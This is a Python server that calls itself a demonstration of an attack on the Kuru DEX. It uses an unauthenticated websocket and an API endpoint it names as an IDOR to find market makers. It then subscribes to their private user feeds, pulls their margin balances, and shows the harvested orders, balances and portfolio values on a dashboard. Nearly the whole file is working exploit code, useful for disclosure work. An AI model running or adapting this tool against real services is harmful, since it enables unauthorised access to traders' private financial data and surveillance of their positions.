"""
Kuru DEX Intelligence Server

Connects to wss://ws.kuru.io (no auth required), collects real-time maker data,
enriches with portfolio info from the API IDOR, and serves it to the dashboard.

This is a DEMONSTRATION of what an attacker could build using the vulnerability.
"""

import asyncio
import json
import time
from collections import defaultdict
from pathlib import Path

import aiohttp
from aiohttp import web
import websockets

# Config
WS_URI = "wss://ws.kuru.io"
API_BASE = "https://api.kuru.io/api/v2"
MARKETS = {
    "0x065c9d28e428a0db40191a54d33d5b7c71a9c394": "MON/USDC",
    "0x851145eaefdc37956b08da829fa31722199f3f07": "XAUt0/USDC",
    "0xa6afd386135b7d41a6c40c525abc4a1019b0d132": "UNKNOWN/USDC",
    "0x40c49f171202f91ff5d2fae34c22dd2bfdd22af0": "WETH/USDC",
}

# Global state
state = {
    "makers": {},
    "events_log": [],
    "stats": {
        "total_events": 0,
        "start_time": time.time(),
        "makers_discovered": 0,
        "total_tvl_observed": 0,
    },
    "orderbook": {"best_bid": 0, "best_ask": 0, "mid": 0},
}

subscribed_makers = set()


def maker_default():
    return {
        "address": "",
        "orders_placed": 0,
        "orders_canceled": 0,
        "fills": 0,
        "buy_orders": [],
        "sell_orders": [],
        "balance_updates": [],
        "portfolio": {},
        "portfolio_usd": 0,
        "markets_active": [],
        "refresh_rate_ms": 0,
        "spread_bps": 0,
        "avg_size_usd": 0,
        "last_seen": 0,
        "first_seen": 0,
        "events": [],
    }


async def fetch_portfolio(address: str):
    """Use the API IDOR to fetch any user's margin balances."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"{API_BASE}/margin/balances/{address}", timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    balances = data.get("data", {}).get("data", [])
                    portfolio = {}
                    total_usd = 0
                    for entry in balances:
                        token = entry.get("token", {})
                        ticker = token.get("ticker", "?")
                        decimal = token.get("decimal", 18)
                        bal_raw = int(entry.get("balance", "0"))
                        bal = bal_raw / (10 ** decimal)
                        usd = 0
                        if ticker in ("USDC", "AUSD", "USDT"):
                            usd = bal
                        elif ticker == "MON":
                            usd = bal * 0.023
                        elif ticker in ("WETH", "ETH"):
                            usd = bal * 3500
                        elif ticker in ("WBTC", "cbBTC"):
                            usd = bal * 67000
                        if bal > 0:
                            portfolio[ticker] = {"balance": bal, "usd": usd}
                            total_usd += usd
                    return portfolio, total_usd
    except Exception:
        pass
    return {}, 0


async def ws_collector():
    """Main WebSocket collector — runs forever, populating global state."""
    while True:
        try:
            async with websockets.connect(WS_URI, ping_interval=20, close_timeout=10) as ws:
                # Subscribe to MON/USDC orderbook
                main_market = "0x065c9d28e428a0db40191a54d33d5b7c71a9c394"
                await ws.send(json.dumps({
                    "type": "subscribe",
                    "channel": "orderbook",
                    "market": main_market,
                }))
                await asyncio.wait_for(ws.recv(), timeout=5)

                while True:
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=2)
                        data = json.loads(msg)
                        now = time.time()
                        state["stats"]["total_events"] += 1

                        # Orderbook price updates
                        if "b" in data and data["b"]:
                            val = data["b"][0][0]
                            state["orderbook"]["best_bid"] = val / 1e8 if val < 1e10 else val / 1e18
                        if "a" in data and data["a"]:
                            val = data["a"][0][0]
                            state["orderbook"]["best_ask"] = val / 1e8 if val < 1e10 else val / 1e18
                        if state["orderbook"]["best_bid"] > 0 and state["orderbook"]["best_ask"] > 0:
                            state["orderbook"]["mid"] = (
                                state["orderbook"]["best_bid"] + state["orderbook"]["best_ask"]
                            ) / 2

                        # Discover makers from orderbook events
                        maker_addr = data.get("m", "")
                        if maker_addr and maker_addr.startswith("0x"):
                            if maker_addr not in state["makers"]:
                                state["makers"][maker_addr] = maker_default()
                                state["makers"][maker_addr]["address"] = maker_addr
                                state["makers"][maker_addr]["first_seen"] = now
                                state["stats"]["makers_discovered"] += 1

                                # Subscribe to their user feed (IDOR)
                                if maker_addr not in subscribed_makers:
                                    subscribed_makers.add(maker_addr)
                                    await ws.send(json.dumps({
                                        "type": "subscribe",
                                        "channel": "user",
                                        "address": maker_addr,
                                    }))
                                    try:
                                        await asyncio.wait_for(ws.recv(), timeout=1)
                                    except:
                                        pass

                                    # Fetch portfolio via API IDOR
                                    portfolio, total_usd = await fetch_portfolio(maker_addr)
                                    state["makers"][maker_addr]["portfolio"] = portfolio
                                    state["makers"][maker_addr]["portfolio_usd"] = total_usd
                                    state["stats"]["total_tvl_observed"] += total_usd

                            maker = state["makers"][maker_addr]
                            maker["last_seen"] = now
                            event_type = data.get("e", "")

                            if event_type == "OrderCreated":
                                maker["orders_placed"] += 1
                                price = data.get("p", 0)
                                size = data.get("s", 0)
                                is_buy = data.get("ib")
                                if is_buy:
                                    maker["buy_orders"].append(price)
                                    if len(maker["buy_orders"]) > 50:
                                        maker["buy_orders"] = maker["buy_orders"][-50:]
                                elif is_buy is False:
                                    maker["sell_orders"].append(price)
                                    if len(maker["sell_orders"]) > 50:
                                        maker["sell_orders"] = maker["sell_orders"][-50:]

                            elif "Cancel" in event_type:
                                maker["orders_canceled"] += 1

                            elif event_type == "Trade":
                                maker["fills"] += 1

                            # Compute derived stats
                            uptime = now - maker["first_seen"]
                            if uptime > 0 and maker["orders_placed"] > 2:
                                maker["refresh_rate_ms"] = (uptime * 1000) / maker["orders_placed"]
                            if maker["buy_orders"] and maker["sell_orders"]:
                                avg_bid = sum(maker["buy_orders"][-10:]) / len(maker["buy_orders"][-10:])
                                avg_ask = sum(maker["sell_orders"][-10:]) / len(maker["sell_orders"][-10:])
                                if avg_bid > 0:
                                    maker["spread_bps"] = (avg_ask - avg_bid) / avg_bid * 10000

                        # User channel data
                        if data.get("topicType") == "user":
                            inner = data.get("data", {})
                            if isinstance(inner, str):
                                try:
                                    inner = json.loads(inner)
                                except:
                                    continue

                            evt = inner.get("type", "")
                            evt_data = inner.get("data", "")
                            if isinstance(evt_data, str):
                                try:
                                    evt_data = json.loads(evt_data)
                                except:
                                    continue

                            maker_addr = data.get("topicID", "")
                            if maker_addr in state["makers"] and isinstance(evt_data, dict):
                                maker = state["makers"][maker_addr]

                                if evt == "BalanceUpdate":
                                    token = evt_data.get("token", "")
                                    balance = evt_data.get("balance", "0")
                                    maker["balance_updates"].append({
                                        "time": now,
                                        "token": token[:10],
                                        "balance": balance,
                                    })
                                    if len(maker["balance_updates"]) > 20:
                                        maker["balance_updates"] = maker["balance_updates"][-20:]

                                elif evt == "OrderCreated":
                                    mkt = evt_data.get("marketAddress", "")
                                    market_name = MARKETS.get(mkt, mkt[:12])
                                    if market_name not in maker["markets_active"]:
                                        maker["markets_active"].append(market_name)

                                # Log event for feed
                                event_entry = {
                                    "time": now,
                                    "maker": maker_addr[:12],
                                    "type": evt,
                                    "market": MARKETS.get(
                                        evt_data.get("marketAddress", ""),
                                        ""
                                    ) if isinstance(evt_data, dict) else "",
                                }
                                state["events_log"].append(event_entry)
                                if len(state["events_log"]) > 200:
                                    state["events_log"] = state["events_log"][-200:]

                    except asyncio.TimeoutError:
                        continue

        except Exception as e:
            print(f"[!] WS disconnected: {e}. Reconnecting in 3s...")
            await asyncio.sleep(3)


# HTTP API routes
async def handle_state(request):
    """Return current intelligence state as JSON."""
    # Serialize for JSON (remove non-serializable)
    output = {
        "makers": {},
        "stats": state["stats"].copy(),
        "orderbook": state["orderbook"],
        "events_log": state["events_log"][-50:],
    }
    output["stats"]["uptime_seconds"] = time.time() - state["stats"]["start_time"]

    for addr, maker in state["makers"].items():
        output["makers"][addr] = {
            "address": addr,
            "orders_placed": maker["orders_placed"],
            "orders_canceled": maker["orders_canceled"],
            "fills": maker["fills"],
            "portfolio": maker["portfolio"],
            "portfolio_usd": maker["portfolio_usd"],
            "markets_active": maker["markets_active"],
            "refresh_rate_ms": round(maker["refresh_rate_ms"]),
            "spread_bps": round(maker["spread_bps"], 2),
            "last_seen": maker["last_seen"],
            "first_seen": maker["first_seen"],
            "balance_updates": maker["balance_updates"][-5:],
        }

    return web.json_response(output)


async def handle_index(request):
    """Serve the dashboard HTML."""
    html_path = Path(__file__).parent / "templates" / "index.html"
    return web.FileResponse(html_path)


async def start_background_tasks(app):
    app["ws_collector"] = asyncio.create_task(ws_collector())


async def cleanup_background_tasks(app):
    app["ws_collector"].cancel()
    await app["ws_collector"]


def create_app():
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/api/state", handle_state)
    static_dir = Path(__file__).parent / "static"
    if static_dir.exists() and any(static_dir.iterdir()):
        app.router.add_static("/static", static_dir)
    app.on_startup.append(start_background_tasks)
    app.on_cleanup.append(cleanup_background_tasks)
    return app


if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8080))
    print("[+] Kuru DEX Intelligence Dashboard")
    print("[+] Connecting to wss://ws.kuru.io (no auth)...")
    print(f"[+] Dashboard at http://0.0.0.0:{port}")
    app = create_app()
    web.run_app(app, host="0.0.0.0", port=port)
